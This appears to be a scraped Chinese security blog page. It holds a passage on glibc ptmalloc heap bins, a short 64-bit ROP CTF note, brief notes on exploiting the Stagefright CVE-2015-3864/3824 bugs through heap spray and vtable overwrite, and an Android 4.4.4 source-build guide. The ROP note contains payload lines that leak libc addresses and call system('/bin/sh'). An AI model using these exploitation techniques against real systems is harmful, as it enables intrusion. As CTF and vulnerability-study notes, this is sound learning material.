<li><strong>Usorted bin 只有一个，回收的chunk块必须先放到unsorted bin中，分配内存时会查看unsorted bin中是否有 合适的chunk，如果找到满足条件的chunk，则直接返回给用户，否则将unsorted bin的所有chunk 放入 small bins 或是 large bins 中。</strong></li>
<li><strong>Small bins 用于存储大小小于512B或1024B固定大小的chunk，共 62 个 bin，最小的 chunk 大小为 16 字节或 32 字节，每个 bin 的大小相差 8 字节或是 16 字节，当分配小内存块时，采用精确匹配的方式从 small bins 中查找合适的 chunk。</strong></li>
<li><strong>Large bins 用于存储大于等于 512B 或 1024B 的空闲 chunk，这些 chunk 使用双向链表的形式按大小顺序排序，分配内存时按最近匹配方式从 large bins 中分配 chunk。</strong></li>
</ul>
<h3 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h3><p>ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index 有如下关系:<br>Chunk_size=<code>2 * SIZE_SZ * index</code><br>在 SIZE_SZ 为 4B 的平台上，small bins 中的 chunk 大小是以 8B 为公差的等差数列，最大 的 chunk 大小为 504B，最小的 chunk 大小为 16B，所以实际共 62 个 bin。分别为 16B、24B、 32B，……，504B。在SIZE_SZ为8B的平台上，small bins中的chunk大小是以16B为公差 的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所以实际共62个bin。 分别为 32B、48B、64B，…… 1008B。<br>ptmalloc 维护了 62 个双向环形链表(每个链表都具有链表头节点，加头节点的最大作用就是便于对链表内节点的统一处理，即简化编程)，每一个链表内的各空闲 chunk 的大小 一致，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可以用如下图来表示在 SIZE_SZ 为 4B 的平台上 ptmalloc 对 512B 字节以下的空闲 chunk 组织方式(所谓的分箱机制)。<br><strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则，所以同一个链表中先被释放的 chunk 会先被分配出去。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-131532.png" alt=""></p>
<h3 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h3><p>在 SIZE_SZ 为 4B 的平台上，大于等于 512B 的空闲 chunk，或者，在 SIZE_SZ 为 8B 的平 台上，大小大于等于 1024B 的空闲 chunk，由 sorted bins 管理。Large bins 一共包括 63 个 bin， 每个 bin 中的 chunk 大小不是一个固定公差的等差数列，而是分成 6 组 bin，每组 bin 是一个 固定公差的等差数列，每组的 bin 数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B 等。<br>以 SIZE_SZ 为 4B 的平台为例，第一个 large bin 的起始 chunk 大小为 512B，共 32 个 bin， 公差为 64B，等差数列满足如下关系:<br>Chunk_size=512 + 64 * index<br>第二个 large bin 的起始 chunk 大小为第一组 bin 的结束 chunk 大小，满足如下关系:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chunk_size=512 + 64 * 32 + 512 * index</span><br></pre></td></tr></table></figure></p>
<p>同理，我们可计算出每个 bin 的起始 chunk 大小和结束 chunk 大小。</p>
<h3 id="Unsorted-bins"><a href="#Unsorted-bins" class="headerlink" title="Unsorted bins"></a>Unsorted bins</h3><p>Unsorted bin 可以看作是 small bins 和 large bins 的 cache，只有一个 unsorted bin，以双向链表管理空闲 chunk，空闲 chunk 不排序，所有的 chunk 在回收时都要先放到 unsorted bin中。<br>分配时，如果在 unsorted bin 中没有合适的 chunk，就会把 unsorted bin 中的所有 chunk 分别加入到所属的 bin 中，然后再在 bin 中分配合适的 chunk。Bins 数组中的元素 bin[1]用于 存储 unsorted bin 的 chunk 链表头。<br><strong>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</strong></p>
<h3 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h3><p>Fast bins主要是用于高小内存的分配效率，<strong>采用LIFO</strong>，默认情况下，对于SIZE_SZ为4B的平台， 小于 64B 的 chunk 分配请求，对于 SIZE_SZ 为 8B 的平台，小于128B 的 chunk 分配请求，首先会查找fast bins中是否有所需大小的 chunk 存在(精确匹配)，如果存在，就直接返回。<br>Fast bins 可以看着是 small bins 的一小部分 cache，默认情况下，fast bins 只 cache 了 small bins 的前 7 个大小的空闲 chunk，也就是说，对于 SIZE_SZ 为 4B 的平台，fast bins 有 7 个 chunk 空闲链表(bin)，每个 bin 的 chunk 大小依次为 16B，24B，32B，40B，48B，56B，64B;对 于SIZE_SZ为8B的平台，fast bins有7个chunk空闲链表(bin)，每个bin的chunk大小依 次为 32B，48B，64B，80B，96B，112B，128B。<br><strong>默认情况下（32位系统为例）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的chunk的数据空间最大为80字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为8字节开始一直到80字节</strong></p>
<p><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的chunk合并。</strong></p>
<h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的bin都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的top chunk。否则，就对heap进行扩展后再进行分配。在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<p><strong>需要注意的是，top chunk 的 prev_inuse 比特位始终为1，否则其前面的chunk就会被合并到top chunk中。</strong></p>
<p>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</p>
<h2 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h2><p>当需要分配的 chunk 足够大，而且 fast bins 和 bins 都不能满足要求，甚至 top chunk 本身也不能满足分配需求时，ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。这样分配的 chunk 在被 free 时将直接解除映射，于是就将内存归还给了操作系统，再次对这样的内存区的引用将导致segmentation fault错误。这样的chunk也不会包含在任何bin中。</p>
<h2 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h2><p>Last remainder 是另外一种特殊的 chunk，就像 top chunk 和 mmaped chunk 一样，不会在任何 bins 中找到这种 chunk。当需要分配一个 small chunk，但在small bins 中找不到合适 的 chunk，如果 last remainder chunk 的大小大于所需的 small chunk 大小，last remainder chunk 被分裂成两个 chunk，其中一个 chunk 返回给用户，另一个 chunk 变成新的 last remainder chuk。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/27/lctf1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/lctf1/" itemprop="url">64位rop的一些原理和思路(慢慢更新)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-27T08:09:58+08:00">
                2018-02-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/栈溢出/" itemprop="url" rel="index">
                    <span itemprop="name">栈溢出</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="考察知识点"><a href="#考察知识点" class="headerlink" title="考察知识点"></a>考察知识点</h2><ul>
<li>64位rop</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-003022.png" alt=""></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>构造rop,leak出libc地址，调用system(“/bin/sh”)</p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>本机测试，所以我先找到自己本机用到的libc.so<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-005750.png" alt=""></p>
<h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><p>ROPgadget –binary xxx –only “pop|ret”<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-012434.png" alt=""></p>
<h3 id="leak-system地址和-bin-sh"><a href="#leak-system地址和-bin-sh" class="headerlink" title="leak system地址和/bin/sh"></a>leak system地址和/bin/sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc.symbols[&apos;system&apos;] - libc.symbols[&apos;puts&apos;] + u64(puts_addr)</span><br><span class="line">sh_addr = next(libc.search(&apos;/bin/sh&apos;))- libc.symbols[&apos;puts&apos;] + u64(puts_addr)</span><br></pre></td></tr></table></figure>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br><span class="line"></span><br><span class="line">payload2=padding+p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/26/stage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/26/stage/" itemprop="url">CVE-2015-3864的思路</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-26T09:24:05+08:00">
                2018-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android漏洞分析基础/" itemprop="url" rel="index">
                    <span itemprop="name">Android漏洞分析基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>关于CVE-2015-3824漏洞本身<br>漏洞的原理是一个因为整数溢出，可以构造堆利用。<br><a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222893.htm</a></p>
<p><strong>在进行漏洞利用时，要关注各种可能分配内存的地方，灵活的使用代码中的内存分配，来布局内存。 同时研究一个漏洞要把相关知识给补齐。对于这个漏洞就是 MPEG4的文件格式和相关的处理代码了。</strong></p>
<h2 id="谷歌的exp"><a href="#谷歌的exp" class="headerlink" title="谷歌的exp"></a>谷歌的exp</h2><p>gp0是构造对象，然后溢出它的虚表，重定向到我们的gadaget。<br>进行大量的heap spray，保证能够执行到gadaget。</p>
<h2 id="Metaphor"><a href="#Metaphor" class="headerlink" title="Metaphor"></a>Metaphor</h2><p>另外有一个Metaphor，是CVE-2015-3824的利用工具，<br>攻击载荷：Web页面（可执行js代码），受害者需要在exp页面上驻留一会（heap spray需要多次尝试）</p>
<h2 id="关于虚表"><a href="#关于虚表" class="headerlink" title="关于虚表"></a>关于虚表</h2><p>(1)识别构造函数：给对象分配内存、将vtable拷贝到分配内存中、成员变量初始化。<br>(2)识别真正的vtable：vtable一定会在某个构造函数中被引用到，所以被引用到的就是真正的vtable。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083340.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083427.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083439.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083554.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-083812.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/24/bianyi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/24/bianyi/" itemprop="url">mac上编译android4.4.4源码</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T10:05:56+08:00">
                2018-02-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android漏洞分析基础/" itemprop="url" rel="index">
                    <span itemprop="name">Android漏洞分析基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一些碎碎念……本来因为想在mac上编译的，还专门买了一个外置的移动硬盘，然后自己按照官网和搜到的无数篇博客精心研究了很久很久，耗时三天，还是GG，但是基本上…xcode是个大坑，算了算了……反正最后始终没弄好，然后，虚拟机走起吧……</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先，虚拟机用的是mac上的parallels desktop，然后镜像是<a href="http://releases.ubuntu.com/12.04/ubuntu-12.04.5-desktop-amd64.iso.torrent?_ga=2.244298688.451892976.1519576871-1559322823.1519576871" target="_blank" rel="noopener">Ubuntu 12.04.5 Desktop (64-bit)</a></p>
<p>然后android源码在<a href="https://pan.baidu.com/s/1ngsZs#list/path=%2FAndroid%E6%BA%90%E7%A0%81" target="_blank" rel="noopener">这里</a>下载，我没有用repo，直接从百度云取的，用的是android4.4.4_r1<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-164515.png" alt=""><br>这样一共只需要下载2G多点……而不是70G（死目</p>
<p>mac上虚拟机快速配置就可以快速安装好系统，不过<strong>记得安装好后，修改一下硬件，空间给128G，内存改4096M，核数改2-4随便</strong>。</p>
<h2 id="安装Java-JDK-1-6"><a href="#安装Java-JDK-1-6" class="headerlink" title="安装Java JDK 1.6"></a>安装Java JDK 1.6</h2><p>jdk版本：jdk-6u45-linux-x64.bin<br>下载地址：<a href="http://app.nidc.kr/java/jdk-6u45-linux-x64.bin" target="_blank" rel="noopener">http://app.nidc.kr/java/jdk-6u45-linux-x64.bin</a></p>
<p>我们先在 /usr/local/目录下创建java文件夹：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">sudo mkdir java</span><br><span class="line">sudo cp [jdk-6u45-linux-x64.bin路径]  /usr/local/java</span><br><span class="line">sudo chmod 777 jdk-6u45-linux-x64.bin</span><br><span class="line">sudo ./jdk-6u45-linux-x64.bin</span><br></pre></td></tr></table></figure></p>
<p>安装成功后,java文件夹下多了一个文件夹：jdk1.6.0_45/<br>然后配置环境变量，用vim打开/ect/profile 文件,嗯，我不会用gedit，日常vim，这个其实随意。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure></p>
<p>添加下面的环境变量，要根据安装目录修改，并保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Java Environment</span><br><span class="line">export JAVA_HOME=/usr/local/java/jdk1.6.0_45  </span><br><span class="line"></span><br><span class="line">export JRE_HOME=/usr/local/java/jdk1.6.0_45/jre  </span><br><span class="line"></span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH  </span><br><span class="line"></span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$JAVA_HOME:$PATH</span><br></pre></td></tr></table></figure></p>
<p>重启后使其生效并进行验证<br>也可使用下面的命令不重启使其生效，不过只针对当前域有效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></p>
<p>其实我是没重启的，直接source就行了，只要不另在终端里开标签或者重启终端就可以。<br>输入java -version 进行验证安装,成功后返回如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;1.6.0_45&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.6.0_45-b06)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 20.45-b01, mixed mode)</span><br></pre></td></tr></table></figure></p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git gnupg flex bison gperf build-essential \</span><br><span class="line">  zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev \</span><br><span class="line">  libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-glx:i386 \</span><br><span class="line">  libgl1-mesa-dev g++-multilib mingw32 tofrodos \</span><br><span class="line">  python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line"></span><br><span class="line">sudo ln -s /usr/lib/i386-linux-gnu/mesa/libGL.so.1 /usr/lib/i386-linux-gnu/libGL.so</span><br></pre></td></tr></table></figure>
<p>必须提到的是！我之前一直遇到很坑的问题，那就是虚拟机重启后打不开，始终没有解决，直到我不死心的尝试第n次，然后搜到了这个。<br><a href="http://www.cnblogs.com/wangzehuaw/p/4057604.html" target="_blank" rel="noopener">http://www.cnblogs.com/wangzehuaw/p/4057604.html</a><br><strong>划重点</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git gnupg flex bison gperf build-essential \</span><br><span class="line">&gt;   zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev \</span><br><span class="line">&gt;   libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-glx:i386 \</span><br><span class="line">&gt;   libgl1-mesa-dev g++-multilib mingw32 tofrodos \</span><br><span class="line">&gt;   python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">zip is already the newest version.</span><br><span class="line">zip set to manually installed.</span><br><span class="line">gnupg is already the newest version.</span><br><span class="line">Some packages could not be installed. This may mean that you have</span><br><span class="line">requested an impossible situation or if you are using the unstable</span><br><span class="line">distribution that some required packages have not yet been created</span><br><span class="line">or been moved out of Incoming.</span><br><span class="line">The following information may help to resolve the situation:</span><br><span class="line"></span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> libgl1-mesa-glx:i386 : Depends: libglapi-mesa:i386 (= 8.0.4-0ubuntu0.6)</span><br><span class="line">                        Recommends: libgl1-mesa-dri:i386 (&gt;= 7.2)</span><br><span class="line">E: Unable to correct problems, you have held broken packages.</span><br></pre></td></tr></table></figure></p>
<p><strong>提示信息说缺少依赖库无法安装libgl1-mesa-glx:i386，那么就不要安装这个库了，从上面的install列表中减去这个库。<br>libgl1-mesa-glx:i386。如果强制安装了这个库会导致重启或关机后无法进入ubuntu问题，很严重。<br>如果也遇到了无法进入ubuntu系统的问题，请重装系统时不要安装这个库。</strong><br>我真的第一次见到会break desktop的库……服了服了。</p>
<p><strong>就因为这个坑了我三天！！！</strong></p>
<p>所以像我一样直接去掉吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git gnupg flex bison gperf build-essential zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib mingw32 tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386</span><br><span class="line">sudo ln -s /usr/lib/i386-linux-gnu/mesa/libGL.so.1 /usr/lib/i386-linux-gnu/libGL.so</span><br></pre></td></tr></table></figure></p>
<h2 id="解压源码"><a href="#解压源码" class="headerlink" title="解压源码"></a>解压源码</h2><p>把之前下载的源码的7z包解压，比如我是建了个目录aosp，然后解压后，就有个android-4.4.4_r1的文件夹。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-171005.png" alt=""></p>
<p>7z文件需要下一个东西来解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install p7zip-full</span><br><span class="line">7z x android-4.4.4_r1.7z</span><br></pre></td></tr></table></figure></p>
<p>解压好之后，进入源码路径，如果你的目录结构和我一样，就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aosp/android-4.4.4_r1</span><br></pre></td></tr></table></figure></p>
<h2 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h2><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>命令删除所有以前编译操作的已有输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make clobber</span><br></pre></td></tr></table></figure></p>
<h3 id="设置环境"><a href="#设置环境" class="headerlink" title="设置环境"></a>设置环境</h3><p>使用build目录中的envsetup.sh脚本初始化环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source build/envsetup.sh</span><br></pre></td></tr></table></figure></p>
<h3 id="选择目标"><a href="#选择目标" class="headerlink" title="选择目标"></a>选择目标</h3><p>因为我不下载到实体机里，就直接输入lunch，然后回车即可。<br>默认选择第一个，即lunch aosp_arm-eng，该命令表示针对模拟器进行完整编译，并且所有调试功能均处于启用状态。</p>
<h3 id="进行编译"><a href="#进行编译" class="headerlink" title="进行编译"></a>进行编译</h3><p>编译前先看看你配置了几个核，然后make -j(核数✖️2)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cpuinfo | grep processor</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-171708.png" alt=""><br>可看到自己创建的虚拟机CPU核心共有2个，所以make -j4<br>编译后输出的文件都放在了源码根目录下的out文件中。</p>
<h2 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -partition-size 300</span><br></pre></td></tr></table></figure>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-25-181351.png" alt=""></p>
<h2 id="导入android源码进android-studio"><a href="#导入android源码进android-studio" class="headerlink" title="导入android源码进android studio"></a>导入android源码进android studio</h2><p>网上的做法比较乱，我只写一下我是怎么做的。<br>1.在整个Android源码全编成功之后，然后编译idegen模块，用以生成Android studio的工程配置文件,编译成功之后就生成了idegen.jar（out/host/darwin-x86/framework/idegen.jar），运行如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source build/ensetup.sh</span><br><span class="line">mmm development/tools/idegen/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-133125.png" alt=""><br>2.在源码根目录生成对应的android.ipr、android.iml IEDA工程配置文件。以便于AndroidStudio可以打开项目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-133411.png" alt=""><br>3.下载android studio并启动<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-133436.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/android-studio/bin</span><br><span class="line">./studio.sh</span><br></pre></td></tr></table></figure></p>
<p>第一次启动要安装sdk，所以记得翻墙。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-134145.png" alt=""><br>4.导入<br>打开 Android studio，选择刚刚生成的 android.ipr 打开，等待加载好了就可以了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-26-140455.png" alt=""></p>
